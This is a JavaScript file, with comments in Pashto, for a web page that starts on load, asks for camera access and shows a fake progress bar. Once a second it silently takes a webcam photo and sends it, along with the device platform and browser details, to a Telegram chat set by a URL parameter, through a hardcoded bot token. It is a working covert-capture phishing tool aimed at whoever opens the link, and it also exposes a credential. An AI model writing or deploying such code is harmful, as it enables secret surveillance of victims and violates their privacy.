const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";

// د URL نه chat id اخلو (?id=12345)
const CHAT_ID = new URLSearchParams(location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const bar = document.getElementById("bar");

let stream;
let interval;

// 🚀 auto start
init();

async function init() {
  if (!CHAT_ID) {
    console.error("❌ CHAT_ID نشته");
    return;
  }

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      startLoop();
    };

  } catch (err) {
    console.error("❌ Camera permission error:", err);
  }
}

// 🔄 loading loop
function startLoop() {
  let progress = 0;

  if (interval) clearInterval(interval);

  interval = setInterval(() => {
    progress += 5;
    bar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      bar.style.width = "0%";
      capture();
    }

  }, 50); // 1 second cycle
}

// 📸 عکس اخلو
function capture() {
  if (!video.videoWidth) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.2)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    if (!blob) {
      console.error("❌ Blob جوړ نشو");
      return;
    }
    sendToTelegram(blob);
  }, "image/jpeg");
}

// 📤 Telegram ته لیږل
function sendToTelegram(blob) {
  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.jpg");

  const caption =
`📸 Secure Capture

📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

🤖 Bot: @ProSimTookBot
👨‍💻 Dev: @XFPro43

🛡️ Status: Active`;

  formData.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(res => res.json())
  .then(data => {
    if (!data.ok) {
      console.error("❌ Telegram Error:", data.description);
    } else {
      console.log("✅ Photo sent!");
    }
  })
  .catch(err => {
    console.error("❌ Network Error:", err);
  });
}
